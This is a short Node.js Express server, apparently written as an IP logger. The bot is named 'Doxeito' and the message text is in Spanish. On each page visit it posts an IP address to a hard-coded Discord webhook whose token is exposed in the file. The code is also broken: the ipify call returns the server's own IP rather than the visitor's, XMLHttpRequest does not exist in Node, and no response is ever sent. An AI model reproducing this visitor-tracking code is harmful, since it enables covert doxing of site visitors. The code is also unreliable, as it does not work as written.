var express = require("express");

var app = express();

app.get("/", (req, res) => {
  console.log(req.ip);
  fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
//    .then(data => res.status(200).json({ userIp: data.ip }));
    .then(data => {
        var request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/1165176949388365836/4SrFU4Dteo8tKuE-H4JOqpmx_6_cpDkrJ_xTu8Q00oZIdZB1m4AdJvpo-Q2pVdLPtLi9");

        request.setRequestHeader('Content-type', 'application/json');

        var params = {
        avatar_url: '',
        username: 'Doxeito',
        content: "Alguien entró a la página, su ip es: " + data.ip,
        allowed_mentions: {
            parse: []
        }
        };

        request.send(JSON.stringify(params));
    })
});

var listener = app.listen(8080, function () {
  console.log("Listening on port " + listener.address().port);
});